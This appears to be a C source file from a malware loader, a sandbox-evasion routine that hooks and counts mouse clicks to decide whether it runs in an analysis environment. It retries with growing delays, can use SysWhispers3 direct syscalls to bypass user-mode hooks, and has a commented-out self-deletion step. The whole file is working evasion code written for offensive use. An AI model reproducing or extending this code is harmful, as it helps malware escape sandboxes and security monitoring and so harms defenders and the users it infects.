#include "anti_analysis.h"

/* Global Variables */
extern DWORD g_hMouseHook;
extern DWORD g_dwMouseClicks;

BOOL AntiAnalysis(DWORD dwMilliSeconds) {
    HANDLE hThread = NULL;
    DWORD   dwThreadId = NULL;
    NTSTATUS STATUS = NULL;
    LARGE_INTEGER DelayInterval = {0};
    FLOAT i = 1;
    LONGLONG Delay = NULL;

    Delay = dwMilliSeconds * 10000;
    DelayInterval.QuadPart = -Delay;

    // self-deletion 
    /*if (!DeleteSelf()) {
        // we don't care for the result - but you can change this if you want
    }*/

    // try 10 times, after that return FALSE
    while (i <= 10) {
        DebugPrint("[#] Monitoring Mouse-Clicks For %d Seconds - Need 6 Clicks To Pass\n", (dwMilliSeconds / 1000));

#ifndef SW3_SYSCALL_ENABLED
        // Using Windows API
        hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)MouseClicksLogger, NULL, NULL, &dwThreadId);
        if (hThread) {
            DebugPrint("\t\t<<>> Thread %d Is Created To Monitor Mouse Clicks For %d Seconds <<>>\n\n", dwThreadId, (dwMilliSeconds / 1000));
            WaitForSingleObject(hThread, dwMilliSeconds);
        }

        // unhooking
        if (g_hMouseHook && !UnhookWindowsHookEx(g_hMouseHook)) {
            DebugPrint("[!] UnhookWindowsHookEx Failed With Error : %d \n", GetLastError());
        }

        // the test
        DebugPrint("[i] Monitored User's Mouse Clicks : %d \n", g_dwMouseClicks);
        // if less than 5 clicks - its a sandbox
        if (g_dwMouseClicks < 6)
            return FALSE;
#else
        // Using SysWhispers3
        if ((STATUS = Sw3NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, MouseClicksLogger, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
            DebugPrint("[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n", STATUS);
            return FALSE;
        }

        if ((STATUS = Sw3NtWaitForSingleObject(hThread, FALSE, &DelayInterval)) != 0 && STATUS != STATUS_TIMEOUT) {
            DebugPrint("[!] NtWaitForSingleObject Failed With Error : 0x%0.8X \n", STATUS);
            return FALSE;
        }

        if ((STATUS = Sw3NtClose(hThread)) != 0) {
            DebugPrint("[!] NtClose Failed With Error : 0x%0.8X \n", STATUS);
            return FALSE;
        }

        // unhooking 
        if (g_hMouseHook && !UnhookWindowsHookEx(g_hMouseHook)) {
            DebugPrint("[!] UnhookWindowsHookEx Failed With Error : %d \n", GetLastError());
            return FALSE;
        }
#endif

        // delaying execution for a specific amount of time
        if (!DelayExecutionVia_NtDE((FLOAT)(i / 2)))
            return FALSE;

        // if the user clicked more than 5 times, we return true
        if (g_dwMouseClicks > 5)
            return TRUE;

        // if not, we reset the mouse-clicks variable and monitor the mouse-clicks again
        g_dwMouseClicks = NULL;

        // increment 'i', so that next time 'DelayExecutionVia_NtDE' will wait longer
        i++;
    }

    return FALSE;
}
